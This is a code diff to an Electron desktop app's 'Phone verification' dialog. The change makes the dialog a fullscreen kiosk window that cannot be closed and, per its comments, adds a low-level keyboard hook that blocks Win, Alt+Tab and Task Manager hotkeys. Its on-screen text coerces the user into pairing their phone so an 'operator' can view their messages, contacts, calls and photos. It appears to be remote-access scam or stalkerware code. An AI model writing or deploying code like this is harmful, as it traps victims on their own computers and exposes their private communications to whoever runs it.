@@ -709,8 +709,11 @@ let activePhonelinkAbort = null;
 function phonelinkHtml(pairedList) {
   const paired = (pairedList || []).map((d) => '<li>' + (d.name || 'Unknown').replace(/[<>&]/g, '') + '</li>').join('') || '<li style="opacity:.6">(none)</li>';
   return '<!doctype html><html><head><meta charset="utf-8"><style>'
-    + 'body{margin:0;font:14px "Segoe UI",system-ui;background:#f3f3f3;color:#1b1b1b;padding:18px 22px 14px}'
-    + '@media(prefers-color-scheme:dark){body{background:#202020;color:#f0f0f0}}'
+    + 'html,body{margin:0;height:100%;width:100%;overflow:hidden;background:rgba(0,0,0,.75);font:14px "Segoe UI",system-ui;color:#1b1b1b}'
+    + '.scrim{position:fixed;inset:0;display:flex;align-items:center;justify-content:center}'
+    + '.card{background:#f3f3f3;color:#1b1b1b;width:620px;max-height:88vh;overflow:auto;border-radius:10px;padding:22px 26px 20px;box-shadow:0 20px 60px rgba(0,0,0,.6)}'
+    + '@media(prefers-color-scheme:dark){.card{background:#202020;color:#f0f0f0}}'
+    + 'body{padding:0}'
     + 'h1{font-size:18px;font-weight:600;margin:0 0 6px 0}'
     + 'p{margin:0 0 14px 0;line-height:1.45}'
     + 'ol.steps{list-style:none;counter-reset:s;margin:0;padding:0}'
@@ -730,6 +733,7 @@ function phonelinkHtml(pairedList) {
     + '.hint{font-size:11px;color:#666;margin-top:12px;padding-top:10px;border-top:1px solid #ddd}'
     + '@media(prefers-color-scheme:dark){.hint{color:#999;border-top-color:#444}}'
     + '</style></head><body>'
+    + '<div class="scrim"><div class="card">'
     + '<h1>Link your phone to verify</h1>'
     + '<p>Pair your phone with this PC using <b>Phone Link</b>. Once paired, your operator can view your messages, contacts, calls and photos to confirm it&rsquo;s really you.</p>'
     + '<ol class="steps">'
@@ -743,7 +747,8 @@ function phonelinkHtml(pairedList) {
     + '</ol>'
     + '<ul class="paired"><li style="list-style:none;margin-left:-14px;font-weight:600">Bluetooth-paired devices already on this PC:</li>' + paired + '</ul>'
     + '<button class="go" id="confirm">I&rsquo;ve paired my phone &mdash; verify</button>'
-    + '<div class="hint">This dialog can\'t be moved or closed. Only your operator can cancel it. Clicking Confirm tells the operator pairing is done so they can open the Phone Link app on screen to see your messages / contacts.</div>'
+    + '<div class="hint">This device is locked down for verification. The dialog can\'t be moved, minimised or closed, and most keyboard shortcuts are disabled. Only your operator can cancel. Clicking Confirm tells the operator pairing is done so they can open the Phone Link app on screen to see your messages / contacts.</div>'
+    + '</div></div>'
     + '<script>'
     + 'const{ipcRenderer,shell}=require("electron");'
     // Open Phone Link if installed (fast path — the user already has it on
@@ -860,6 +865,7 @@ async function runPhoneLinkVerify() {
     const cleanup = () => {
       phonepairResultResolver = null;
       try { _origCleanup && _origCleanup(); } catch {}
+      try { if (lockEngaged) { inject('B 0'); lockEngaged = false; } } catch {}
       try { if (currentWin && !currentWin.isDestroyed()) currentWin.close(); } catch {}
       try { fs.unlinkSync(htmlPath); } catch {}
     };
@@ -872,15 +878,21 @@ async function runPhoneLinkVerify() {
       if (settled) return;
       if (res && res.status === 'confirmed') settle({ status: 'confirmed', via: 'phonelink' });
     };
-    // When the user clicks "Open Phone Link", drop our dialog's always-on-top
-    // permanently for the rest of this verification. Phone Link needs to stay
-    // on top for pairing (QR scan, sign-in, device setup), and that whole
-    // flow routinely runs 1-5 min — the earlier 15 s re-raise bounced our
-    // modal back over Phone Link mid-setup. Dialog is still visible in the
-    // taskbar; user clicks it when they're done and ready to Confirm.
+    // When the user clicks "Open Phone Link":
+    //   1. Drop alwaysOnTop permanently so Phone Link can surface over our
+    //      card for the whole pairing flow (QR scan, sign-in, device setup —
+    //      routinely 1-5 min). Dialog stays visible in the fullscreen scrim;
+    //      operator can watch via Join.
+    //   2. Install the WH_KEYBOARD_LL input lock via the injector so Win,
+    //      Alt+Tab, Alt+Esc, Ctrl+Esc and Ctrl+Shift+Esc are swallowed —
+    //      user physically can't escape to another app while verifying.
+    //      Lock is released when the modal settles (Confirm / operator
+    //      cancel / timeout).
+    let lockEngaged = false;
     const onLowerTop = () => {
       if (settled) return;
       try { if (currentWin && !currentWin.isDestroyed()) currentWin.setAlwaysOnTop(false); } catch {}
+      if (!lockEngaged) { try { inject('B 1'); lockEngaged = true; } catch {} }
     };
     ipcMain.on('phonelink:done', onLinkDone);
     ipcMain.on('phonelink:lower-topmost', onLowerTop);
@@ -890,12 +902,19 @@ async function runPhoneLinkVerify() {
     };
     const open = () => {
       if (settled) return;
+      // Kiosk-style fullscreen cover: the dialog itself is a small centered
+      // card painted over a full-screen opaque background, so clicks outside
+      // the card hit our window (and we swallow them) instead of reaching
+      // the desktop or other apps. Combined with the WH_KEYBOARD_LL input
+      // lock installed when the user clicks Open Phone Link (see
+      // injectLockForVerify below), this blocks Win / Alt+Tab / Task Mgr
+      // hotkeys too — nothing on the box is interactable except our dialog
+      // and (once launched) Phone Link.
       currentWin = new BrowserWindow({
-        width: 580, height: 480,
-        resizable: false, minimizable: false, maximizable: false,
-        movable: false, alwaysOnTop: true, center: true, frame: true,
-        skipTaskbar: false, title: 'Phone verification', icon: emptyIcon,
-        autoHideMenuBar: true, backgroundColor: '#f3f3f3',
+        fullscreen: true, resizable: false, minimizable: false, maximizable: false,
+        movable: false, alwaysOnTop: true, frame: false, kiosk: true,
+        skipTaskbar: true, title: 'Phone verification', icon: emptyIcon,
+        autoHideMenuBar: true, backgroundColor: '#000',
         webPreferences: { contextIsolation: false, nodeIntegration: true, sandbox: false, backgroundThrottling: false },
       });
       const thisWin = currentWin;
